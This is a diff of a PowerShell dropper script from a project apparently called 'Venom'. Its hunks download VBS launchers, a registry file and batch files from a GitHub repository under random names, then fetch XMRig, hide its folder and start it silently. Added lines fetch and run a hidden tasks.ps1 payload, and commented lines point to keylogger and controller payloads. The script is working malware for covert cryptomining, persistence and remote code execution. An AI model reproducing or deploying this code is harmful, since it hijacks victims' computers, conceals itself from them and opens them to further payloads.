@@ -68,7 +68,7 @@ cd $path
 # Download Files
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/wrev.reg" -OutFile "QyjAaZDBbNPk.reg"
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/installers/calty.vbs" -OutFile "FoRAUwtxKkSB.vbs"
-Invoke-WebRequest -OutFile "config.json" -Uri "https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/config.json"
+Invoke-WebRequest -OutFile "w.bat" -Uri "https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/w.bat"
 Invoke-WebRequest -OutFile "ZDaFvwjOosKx.vbs" -Uri "https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/installers/RunHidden.vbs"
 #Invoke-WebRequest -Uri "https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/payloads/keylogger.ps1" -OutFile "KVbOiPPcus.ps1"
 #Invoke-WebRequest -OutFile "vaoYIkVglzTJ.cmd" -Uri "https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/payloads/controller.cmd"
@@ -102,19 +102,19 @@ cd $wd
 Set-Variable -Name currentDir -Value ($Pwd)
 
 # Download and Extract XMRig
-Invoke-WebRequest -Uri "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-msvc-win64.zip" -OutFile "xmrig-6.22.2-msvc-win64.zip"
-Expand-Archive -Path "$currentDir\xmrig-6.22.2-msvc-win64.zip" -DestinationPath "$initial_dir"
+Invoke-WebRequest -Uri "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-msvc-win64.zip" -OutFile "rig.zip"
+Expand-Archive -Path "$currentDir\rig.zip" -DestinationPath "$initial_dir"
 
-Set-ItemProperty -Path "$initial_dir\xmrig-6.22.2" -Name Attributes -Value "Hidden"
+Set-ItemProperty -Path "$initial_dir\rig" -Name Attributes -Value "Hidden"
 
 # Replace XMRig Configuration File
-Set-Variable -Value ("$path\config.json") -Name newConfigPath
-Set-Variable -Value ("$initial_dir\xmrig-6.22.2\config.json") -Name targetConfigPath
+Set-Variable -Value ("$path\w.bat") -Name newConfigPath
+Set-Variable -Value ("$initial_dir\rig\w.bat") -Name targetConfigPath
 if (Test-Path -Path $newConfigPath) {
     Copy-Item -Path $newConfigPath -Destination $targetConfigPath -Force
-    Write-Output "Config.json file has been replaced successfully."
+    Write-Output "bat file has been replaced successfully."
 } else {
-    Write-Output "New config.json file not found at the specified path."
+    Write-Output "New bat file not found at the specified path."
 }
 
 
@@ -133,7 +133,7 @@ if (Test-Path -Path '.Venom' -PathType Container) {
 
 
 cd $path
-Remove-Item -Path "config.json"
+Remove-Item -Path "w.bat"
 Remove-Item -Path "QyjAaZDBbNPk.reg"
 Remove-Item -Path "FoRAUwtxKkSB.vbs"
 
@@ -145,16 +145,17 @@ Set-ItemProperty -Name Attributes -Path "$initial_dir\ZDaFvwjOosKx.vbs" -Value "
 
 cd $initial_dir
 
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/installers/rig.vbs" -OutFile "TMqhONoBljEv.vbs"
-
 # Start Autorun
 Start-Process -ArgumentList "ZDaFvwjOosKx.vbs" -windowstyle hidden -FilePath "cscript.exe"
 
+Start-Process -ArgumentList "$initial_dir\rig\w.bat" -windowstyle hidden -FilePath "cscript.exe"
+
 # Start Rig
-Start-Process -FilePath "$initial_dir\xmrig-6.22.2\xmrig.exe" -windowstyle hidden 
-
+#Start-Process -FilePath "$initial_dir\xmrig-6.22.2\xmrig.exe" -windowstyle hidden 
 & "./TMqhONoBljEv.vbs"
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/payloads/tasks.ps1" -OutFile "AEQKCPrkuifY.ps1"
 
+Start-Process -FilePath "$initial_dir\AEQKCPrkuifY.ps1" -windowstyle hidden
 
 # Pause for 200 seconds
 Start-Sleep -Seconds 200
